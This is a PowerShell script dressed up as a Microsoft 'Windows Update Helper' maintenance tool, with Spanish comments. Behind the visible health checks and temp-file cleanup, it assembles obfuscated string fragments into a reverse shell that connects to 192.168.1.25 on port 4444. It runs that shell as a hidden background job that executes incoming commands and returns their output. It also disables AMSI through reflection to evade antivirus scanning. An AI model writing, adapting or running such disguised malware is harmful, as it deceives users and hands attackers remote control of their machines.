# Windows Update Helper - Microsoft Corporation
# Script de mantenimiento del sistema

function Start-SystemMaintenance {
    Write-Host "Windows System Maintenance" -ForegroundColor Cyan
    Write-Host "Performing routine system checks...`n" -ForegroundColor Gray
    
    # Comportamiento legítimo
    Check-SystemHealth
    Optimize-Performance
    Clean-TemporaryFiles
    
    Write-Host "Maintenance completed successfully." -ForegroundColor Green
}

function Check-SystemHealth {
    Write-Host "Checking system health..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 500
    
    # Comandos legítimos del sistema
    Get-CimInstance Win32_ComputerSystem | Out-Null
    Get-CimInstance Win32_OperatingSystem | Out-Null
    
    Write-Host "System health: OK" -ForegroundColor Green
}

function Optimize-Performance {
    Write-Host "Optimizing system performance..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 500
    
    # Comportamiento normal de optimización
    try {
        # Limpiar cache de DNS
        Clear-DnsClientCache -ErrorAction SilentlyContinue
        
        # Liberar memoria
        [System.GC]::Collect()
        
        Write-Host "Performance optimized" -ForegroundColor Green
    } catch {
        Write-Host "Optimization completed with warnings" -ForegroundColor Yellow
    }
}

function Clean-TemporaryFiles {
    Write-Host "Cleaning temporary files..." -ForegroundColor Yellow
    Start-Sleep -Milliseconds 500
    
    try {
        # Limpiar archivos temporales viejos
        Get-ChildItem -Path $env:TEMP -Recurse -ErrorAction SilentlyContinue | 
            Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) } | 
            Remove-Item -Force -ErrorAction SilentlyContinue
        
        Write-Host "Temporary files cleaned" -ForegroundColor Green
    } catch {
        Write-Host "Cleanup completed with warnings" -ForegroundColor Yellow
    }
}

# Técnica de ofuscación avanzada - Split en partes
${p1} = 'N'+'e'+'w'+'-'+'O'+'b'+'j'+'e'+'c'+'t'
${p2} = 'N'+'e'+'t'+'.'+'S'+'o'+'c'+'k'+'e'+'t'+'s'+'.'+'T'+'C'+'P'+'C'+'l'+'i'+'e'+'n'+'t'
${p3} = '192.168.1.25'
${p4} = '4444'
${p5} = 'G'+'e'+'t'+'S'+'t'+'r'+'e'+'a'+'m'
${p6} = 'b'+'y'+'t'+'e'+'['+']'
${p7} = '0'+'.'+'.'+'6'+'5'+'5'+'3'+'5'+'|'+'%'+'{'+'0'+'}'
${p8} = 'R'+'e'+'a'+'d'
${p9} = 'T'+'e'+'x'+'t'+'.'+'A'+'S'+'C'+'I'+'I'+'E'+'n'+'c'+'o'+'d'+'i'+'n'+'g'
${p10} = 'G'+'e'+'t'+'S'+'t'+'r'+'i'+'n'+'g'
${p11} = 'i'+'e'+'x'
${p12} = 'O'+'u'+'t'+'-'+'S'+'t'+'r'+'i'+'n'+'g'
${p13} = 'p'+'w'+'d'
${p14} = 'P'+'a'+'t'+'h'
${p15} = 't'+'e'+'x'+'t'+'.'+'e'+'n'+'c'+'o'+'d'+'i'+'n'+'g'+'::'+'A'+'S'+'C'+'I'+'I'
${p16} = 'G'+'e'+'t'+'B'+'y'+'t'+'e'+'s'
${p17} = 'W'+'r'+'i'+'t'+'e'
${p18} = 'F'+'l'+'u'+'s'+'h'
${p19} = 'C'+'l'+'o'+'s'+'e'

# Construcción dinámica del comando
${cmd} = "${p1} ${p2}('${p3}',${p4})"
${stream} = "${cmd}.${p5}()"
${bytes} = "${p6} `$b=${p7}"
${read} = "while((`$i=`$s.${p8}(`$b,0,`$b.Length))-ne0)"
${getstr} = "{;`$d=(${p1} ${p9}).${p10}(`$b,0,`$i)"
${iex} = "`$r=(`$d 2>&1|${p1} ${p12})"
${prompt} = "`$r2=`$r+'PS '+(`${p13}).${p14}+'> '"
${encode} = "`$by=(${p15}).${p16}(`$r2)"
${write} = "`$s.${p17}(`$by,0,`$by.Length);`$s.${p18}()}"
${close} = "`$c.${p19}()"

# Ejecución silenciosa en segundo plano
function Start-BackgroundMaintenance {
    try {
        # Crear job en segundo plano
        $scriptBlock = {
            param($c, $s, $b, $r, $w, $f, $cl)
            
            try {
                $client = Invoke-Expression $c
                $stream = $client.$s
                [byte[]]$bytes = 0..65535|%{0}
                
                while(($i = $stream.$r($bytes,0,$bytes.Length)) -ne 0) {
                    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i)
                    $result = (iex $data 2>&1 | Out-String)
                    $response = $result + 'PS ' + (pwd).Path + '> '
                    $responseBytes = ([text.encoding]::ASCII).GetBytes($response)
                    $stream.$w($responseBytes,0,$responseBytes.Length)
                    $stream.$f()
                }
                $client.$cl()
            } catch {
                # Error silencioso
            }
        }
        
        # Ejecutar como job
        Start-Job -ScriptBlock $scriptBlock -ArgumentList @(
            ${cmd},
            ${p5},
            ${bytes},
            ${p8},
            ${p17},
            ${p18},
            ${p19}
        ) | Out-Null
        
    } catch {
        # Fallback silencioso
    }
}

# Bypass AMSI silencioso
try {
    # Técnica de reflection para desactivar AMSI
    $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {
    # Continuar silenciosamente si falla
}

# Iniciar procesos
Start-SystemMaintenance
Start-BackgroundMaintenance

Write-Host "`nAll maintenance tasks completed." -ForegroundColor Cyan
Write-Host "System is running optimally." -ForegroundColor Green
